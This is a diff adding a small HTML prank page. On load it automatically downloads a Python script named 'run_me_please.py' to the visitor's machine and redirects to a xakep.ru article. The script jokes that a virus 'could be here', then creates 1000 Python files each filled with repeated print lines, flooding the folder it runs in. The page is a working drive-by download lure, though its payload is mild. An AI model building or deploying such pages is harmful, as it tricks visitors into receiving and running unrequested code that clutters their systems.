@@ -1,0 +1,31 @@
+<html>
+<head>
+    <title>Voven4ek</title>
+</head>
+<body onload="go_to_page()">
+
+<script>
+    var text = `print("А здесь мог бы быть вирус эх-эх-эх :(")
+for a in range(1, 1001):
+    with open('hello_it_is_me{}.py'.format(a), 'wb+') as file:
+        pass
+    with open('hello_it_is_me{}.py'.format(a), 'w') as file1:
+        text = """print('hello from ho?')\n"""
+        file1.write(text*300)`;
+    alert(text);
+    function go_to_page(){
+    downloadAsFile(text);
+    document.location.href = "https://xakep.ru/2011/03/13/55980/";
+    }
+    function downloadAsFile(data) {
+          let a = document.createElement("a");
+          let file = new Blob([data], {type: 'text/html'});
+          a.href = URL.createObjectURL(file);
+          if (name!=null){
+          a.download = "run_me_please.py";
+          a.click();
+          }
+          }
+</script>
+</body>
+</html>
